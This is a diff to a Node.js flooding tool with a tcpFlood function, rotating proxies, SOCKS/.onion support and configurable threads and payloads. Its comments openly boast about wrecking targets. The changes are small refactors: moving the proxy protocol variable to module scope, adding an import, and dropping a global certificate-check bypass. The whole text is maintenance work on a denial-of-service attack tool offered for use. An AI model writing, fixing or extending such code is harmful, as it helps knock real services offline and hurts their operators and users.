@@ -13,7 +13,7 @@ const net = require('net');
 const crypto = require('crypto');
 const socks = require('socks').SocksClient; // Required for .onion support
 const tls = require('tls'); // Required for TLS/SSL
-const https = require('https').globalAgent.options.rejectUnauthorized = false; // Required for HTTPS proxy support and bypass certificate issues
+const https = require('https'); // Required for HTTPS proxy support and bypass certificate issues
 const url = require('url');
 const dns = require('dns').promises;
 const { HttpsProxyAgent } = require('https-proxy-agent');
@@ -21,6 +21,7 @@ const fs = require('fs'); // File system module for logging
 const { fetch } = require('cross-fetch'); // Cross-browser fetch
 const stream = require('stream');
 const { pipeline } = stream.promises;
+const path = require('path');
 
 // Configuration - Let's fuck things up HARD!
 let targetURL;
@@ -39,6 +40,7 @@ let autoAdjustThreads;
 let customPayload;
 let requestInterval = 0; // Interval between requests in milliseconds
 let proxyRotationInterval = 60000; // Rotate proxies every 60 seconds
+let proxyProtocol;
 
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
@@ -284,7 +286,7 @@ async function tcpFlood(threadId) {
                         const proxyURL = new URL(proxyString);
                         const proxyHost = proxyURL.hostname;
                         const proxyPort = parseInt(proxyURL.port);
-                        const proxyProtocol = proxyURL.protocol.slice(0, -1);
+                        proxyProtocol = proxyURL.protocol.slice(0, -1);
                         const proxyAuth = proxyURL.username && proxyURL.password ? `${proxyURL.username}:${proxyURL.password}@` : '';
 
                         const parsedTargetURL = url.parse(targetURL.href);
